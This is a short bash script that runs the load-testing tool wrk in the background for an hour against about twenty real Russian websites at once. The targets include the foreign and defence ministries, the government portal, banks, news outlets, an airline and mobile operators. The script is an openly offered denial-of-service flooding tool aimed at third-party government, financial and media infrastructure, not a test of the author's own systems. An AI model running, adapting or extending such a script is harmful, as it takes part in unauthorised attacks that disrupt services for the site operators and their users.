#!/bin/bash

D=3600
C=10
T=5

wrk -d $D -c $C -t $T http://mid.ru/ &
wrk -d $D -c $C -t $T https://mil.ru/ &
wrk -d $D -c $C -t $T https://alfabank.ru/ &
wrk -d $D -c $C -t $T https://www.vtb.ru/ &
wrk -d $D -c $C -t $T http://government.ru/ &
wrk -d $D -c $C -t $T https://ria.ru/ &
wrk -d $D -c $C -t $T https://www.rossiya-airlines.com/ &
wrk -d $D -c $C -t $T https://vgtrk.ru/russiatv &
wrk -d $D -c $C -t $T https://more.tv/online/russia1_hd/ &
wrk -d $D -c $C -t $T https://www.rbc.ru/ &
wrk -d $D -c $C -t $T https://aif.ru/ &
wrk -d $D -c $C -t $T https://moscow.megafon.ru/ &
wrk -d $D -c $C -t $T http://megafongid.com/megafon-tv &
wrk -d $D -c $C -t $T http://www.procontent.ru/news/11795.html &
wrk -d $D -c $C -t $T http://tele2life.ru/1/content/view/189/ &
wrk -d $D -c $C -t $T http://tele2life.ru/1/content/view/643/ &
wrk -d $D -c $C -t $T https://beelineru.ru/ &
wrk -d $D -c $C -t $T https://beeline.tv/ &
wrk -d $D -c $C -t $T https://moskva.beeline.ru/customers/products/ &
wrk -d $D -c $C -t $T https://moskva.beeline.ru/customers/products

